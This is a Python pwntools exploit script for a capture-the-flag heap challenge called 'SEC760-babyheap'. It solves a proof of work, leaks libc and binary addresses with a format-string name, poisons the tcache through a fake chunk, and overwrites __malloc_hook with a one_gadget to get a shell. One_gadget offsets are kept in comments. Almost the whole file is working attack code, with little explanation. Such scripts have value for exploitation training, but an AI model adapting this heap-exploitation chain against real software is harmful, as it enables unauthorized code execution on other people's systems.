#!/usr/bin/python3

from pwn import *
from hashlib import sha256, md5
from itertools import product
from sys import exit

chars = b'abcdefghijklmnopqrstuvwxyz0123456789'

def choose(choice):
    global p

    p.sendlineafter(b'> ', choice)

def login(name, password):
    global p

    choose(b'1')
    p.sendlineafter(b': ', name)
    p.sendlineafter(b': ', password)

def info():
    choose(b'2')

def create(size, data):
    global p

    choose(b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

def delete(index):
    global p

    choose(b'4')
    p.sendlineafter(b': ', str(index).encode())

def exit():
    choose(b'5')

def proof_of_work(last_six):
    for possible in product(chars, repeat=4):
        if sha256(bytes(possible)).hexdigest()[-6:].encode() == last_six:
            return bytes(possible)
        
    log.failure('You had no lucky')
    exit(1)


elf = ELF('SEC760-babyheap')

if args.REMOTE:
    p = remote('babyheap.deadlisting.com', 5760)
    libc = ELF('libc.so.6') # Used libc-database to find out the correct libc version used in the challenge
    delta_one_gadget = 0xe2383

    """
    0xe237f execve("/bin/sh", rcx, [rbp-0x70])
    constraints:
      [rcx] == NULL || rcx == NULL
      [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

    0xe2383 execve("/bin/sh", rcx, rdx)
    constraints:
      [rcx] == NULL || rcx == NULL
      [rdx] == NULL || rdx == NULL

    0xe2386 execve("/bin/sh", rsi, rdx)
    constraints:
      [rsi] == NULL || rsi == NULL
      [rdx] == NULL || rdx == NULL

    0x106ef8 execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
    """
else:
    p = process(elf.path)
    libc = elf.libc
    delta_one_gadget = 0xc83bd

    """
    0xc83ba execve("/bin/sh", r12, r13)
    constraints:
      [r12] == NULL || r12 == NULL
      [r13] == NULL || r13 == NULL

    0xc83bd execve("/bin/sh", r12, rdx)
    constraints:
      [r12] == NULL || r12 == NULL
      [rdx] == NULL || rdx == NULL

    0xc83c0 execve("/bin/sh", rsi, rdx)
    constraints:
      [rsi] == NULL || rsi == NULL
      [rdx] == NULL || rdx == NULL

    0xe652b execve("/bin/sh", rsp+0x60, environ)
    constraints:
      [rsp+0x60] == NULL

    """

    if args.GDB:
        gdb.attach(p, '''
            brva 0x1230
            brva 0x17e8
            continue
            ''')

last_six = p.recvline().strip()[-6:]
log.info(f'Looking for proof for {last_six}')

proof = proof_of_work(last_six)
log.success(f'The proof is {proof}')

p.sendlineafter(b'> ', proof)

# 1. Leak libc and binary addresses

name = b'%p' * 12
password = md5(name).hexdigest().encode()

login(name, password)

info()

p.recvuntil(b'= ')
free_hook_addr = int(p.recvuntil(b'(')[:-1], 16)
libc.address = free_hook_addr - libc.sym.__free_hook

p.recvuntil(b')0')
leak_binary = int(b'0' + p.recvuntil(b'a740x')[:-2], 16)
elf.address = leak_binary - 0x1a74
note_list_addr = elf.address + 0x4080

bin_sh_addr = libc.search(b'/bin/sh\x00').__next__()

log.info(f'__free_hook @ {hex(free_hook_addr)}')
log.info(f'__malloc_hook @ {hex(libc.sym.__malloc_hook)}')
log.info(f'libc @ {hex(libc.address)}')
log.info(f'binary @ {hex(elf.address)}')
log.info(f'note_list @ {hex(note_list_addr)}')
log.info(f'system @ {hex(libc.sym.system)}')
log.info(f'/bin/sh\x00 @ {hex(bin_sh_addr)}')

fake_tcache = libc.sym.__malloc_hook - 0x1b + 0x8

fake_fd = note_list_addr - 0x18
fake_bk = note_list_addr - 0x10

log.info(f'fake_fd = {hex(fake_fd)}')
log.info(f'fake_bk = {hex(fake_bk)}')

# 2. Poison tcache list

create(0x68, p64(0) + p64(0xd1) + p64(fake_fd) + p64(fake_bk))
create(0x68, b'B' * 0x40)
create(0x608, b'C' * 0x40)
create(0x68, b'D' * 0x40)

delete(1)

create(0x68, b'E' * 0x60 + p64(0xd0) + b'\x10')

delete(2)
delete(3)
delete(1)
create(0xd0, b'F' * 0x50 + p64(0) + p64(0x71) + p64(fake_tcache))

create(0x5f0, b'G' * 0x40)

create(0x68, b'H' * 0x40)
create(0x68, b'I' * 0x13 + p64(libc.address + delta_one_gadget))

# 3. Call system('/bin/sh\x00')

choose(b'3')
p.sendlineafter(b': ', str(0).encode())

p.interactive()
